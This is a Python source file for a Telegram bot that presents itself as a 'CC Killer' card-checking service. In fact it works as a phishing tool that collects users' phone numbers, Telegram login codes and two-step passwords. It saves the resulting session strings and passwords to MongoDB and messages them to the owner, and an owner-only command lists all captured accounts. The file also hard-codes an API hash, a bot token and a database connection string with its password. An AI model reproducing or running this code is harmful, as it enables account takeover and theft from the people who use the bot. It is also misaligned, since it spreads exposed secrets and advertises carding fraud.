import re
import asyncio
import threading
from flask import Flask
from pyrogram import Client, filters
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession
from pymongo import MongoClient

# Telegram API Credentials
API_ID = 29657994
API_HASH = "85f461c4f637911d79c65da1fc2bdd77"
BOT_TOKEN = "8009070392:AAF2e26nQnu49Z9Z8UHJFNOPivSGLMjzb-o"
OWNER_USERNAME = "@Rishu1286"
MONGO_URL = "mongodb+srv://Krishna:pss968048@cluster0.4rfuzro.mongodb.net/?retryWrites=true&w=majority"

# MongoDB Setup
mongo = MongoClient(MONGO_URL)
db = mongo['cc_killer']
sessions_col = db['sessions']
user_data = {}

# Flask & Pyrogram Setup
app = Client("cc_killer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
flask_app = Flask(__name__)

# Start Command
@app.on_message(filters.command("start"))
async def start(client, message: Message):
    keyboard = [[InlineKeyboardButton("Register", callback_data="register")]]
    markup = InlineKeyboardMarkup(keyboard)
    instructions = (
        "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ 《 ₡₡ кɪʟʟᴇʀ 》!\n\n"
        f"ʜᴇʏ {message.from_user.first_name}\n\n"
        "ʜᴇʀᴇ’ꜱ ʜᴏᴡ ʏᴏᴜ ᴄᴀɴ ɢᴇᴛ ꜱᴛᴀʀᴛᴇᴅ::\n\n"
        " * ⌁ How it Works ! *\n\n"
        "ꜰᴇᴀᴛᴜʀᴇꜱ ⌁⌁\n"
        "[✓] /cu  [card_details] ⌁ ᴋɪʟʟ ᴄᴄ\n"
        "[✓] /b3  [card_details] ⌁ ᴄʜᴇᴄᴋ ᴄᴀʀᴅ"
    )
    await message.reply_text(instructions, reply_markup=markup)

# Register Inline Button
@app.on_callback_query(filters.regex("register"))
async def inline_register(client, callback_query):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await callback_query.message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)

# Register Command
@app.on_message(filters.command("register"))
async def register(client, message: Message):
    keyboard = [[KeyboardButton("Share phone number", request_contact=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("Please share your phone number to begin the login process.", reply_markup=reply_markup)

# Phone Number Handler
@app.on_message(filters.contact)
async def handle_phone_number(client, message: Message):
    phone_number = message.contact.phone_number
    user_id = message.chat.id

    await message.reply_text("Sending OTP...")

    try:
        tele_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await tele_client.connect()
        result = await tele_client.send_code_request(phone_number)

        user_data[user_id] = {
            "client": tele_client,
            "phone_number": phone_number,
            "phone_code_hash": result.phone_code_hash,
        }

        await message.reply_text(
            "OTP has been sent!\nEnter OTP using the buttons below:",
            reply_markup=generate_otp_keyboard()
        )

    except Exception as e:
        await message.reply_text(f"Error sending OTP: {str(e)}")

    try:
        await message.delete()
    except:
        pass

# OTP Keyboard Generator
def generate_otp_keyboard(current_otp=""):
    buttons = []
    for i in range(10):
        buttons.append(InlineKeyboardButton(str(i), callback_data=f"otp_{current_otp}{i}"))
    rows = [buttons[i:i+3] for i in range(0, 9, 3)]
    rows.append([buttons[9]])
    rows.append([
        InlineKeyboardButton("⌫ Backspace", callback_data=f"otp_back_{current_otp}"),
        InlineKeyboardButton("✅ Submit", callback_data=f"otp_submit_{current_otp}")
    ])
    return InlineKeyboardMarkup(rows)

# OTP Inline Button Handler
@app.on_callback_query(filters.regex("^otp_"))
async def handle_otp_input(client, callback_query):
    data = callback_query.data
    user_id = callback_query.from_user.id

    if data.startswith("otp_back_"):
        otp = data.split("_", 2)[2][:-1]
    elif data.startswith("otp_submit_"):
        otp = data.split("_", 2)[2]
        await callback_query.answer("Verifying OTP...")
        fake_msg = Message(
            id=callback_query.message.id,
            chat=callback_query.message.chat,
            from_user=callback_query.from_user,
            text=otp
        )
        await handle_otp_or_password(client, fake_msg)
        return
    else:
        otp = data.split("_", 1)[1]

    await callback_query.edit_message_text(
        f"Current OTP: `{otp}`\n\nUse the buttons below to complete OTP:",
        reply_markup=generate_otp_keyboard(otp)
    )

# OTP and 2FA Handler
@app.on_message(filters.text & filters.private)
async def handle_otp_or_password(client, message: Message):
    user_id = message.chat.id
    if user_id not in user_data:
        return

    user_info = user_data[user_id]
    telethon_client = user_info["client"]

    if user_info.get("awaiting_password"):
        password = message.text.strip()
        try:
            await telethon_client.sign_in(password=password)
            session_string = telethon_client.session.save()

            sessions_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "user_id": user_id,
                    "phone_number": user_info['phone_number'],
                    "session": session_string,
                    "password": password
                }}, upsert=True
            )

            await app.send_message(OWNER_USERNAME, f"2FA login success for {user_info['phone_number']}:\nSession: `{session_string}`\nPassword: `{password}`")
            await message.reply_text("Login successful with 2FA!")

        except Exception as e:
            await message.reply_text(f"2FA login failed: {str(e)}")

        finally:
            await telethon_client.disconnect()
            user_data.pop(user_id, None)
        return

    otp = message.text.strip()
    try:
        await telethon_client.sign_in(user_info["phone_number"], otp, phone_code_hash=user_info["phone_code_hash"])
        session_string = telethon_client.session.save()

        sessions_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "user_id": user_id,
                "phone_number": user_info['phone_number'],
                "session": session_string,
                "password": None
            }}, upsert=True
        )

        await app.send_message(OWNER_USERNAME, f"Login success for {user_info['phone_number']}\nSession: `{session_string}`")
        await message.reply_text("Login successful!")
        await telethon_client.disconnect()
        user_data.pop(user_id, None)

    except SessionPasswordNeededError:
        await message.reply_text("Two-Step Verification is enabled. Please send your password:")
        user_info["awaiting_password"] = True

    except PhoneCodeInvalidError:
        await message.reply_text("Invalid OTP. Please try again.")
    except Exception as e:
        await message.reply_text(f"Error logging in: {str(e)}")
        await telethon_client.disconnect()
        user_data.pop(user_id, None)

    try:
        await message.delete()
    except:
        pass

# View Logged In Users
@app.on_message(filters.command("rishu"))
async def view_logged_in_users(client, message: Message):
    if message.from_user.username != OWNER_USERNAME.strip("@"):
        return

    users = sessions_col.find()
    text = "**Logged In Users:**\n\n"
    for user in users:
        text += f"**Phone:** `{user['phone_number']}`\n**Session:** `{user['session']}`"
        if user.get("password"):
            text += f"\n**2FA Password:** `{user['password']}`"
        text += "\n\n"

    await message.reply_text(text or "No users logged in.")

# Flask Route
@flask_app.route('/')
def home():
    return "Bot is running"

# Run Flask + Pyrogram
if __name__ == "__main__":
    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=8080)).start()
    app.run()
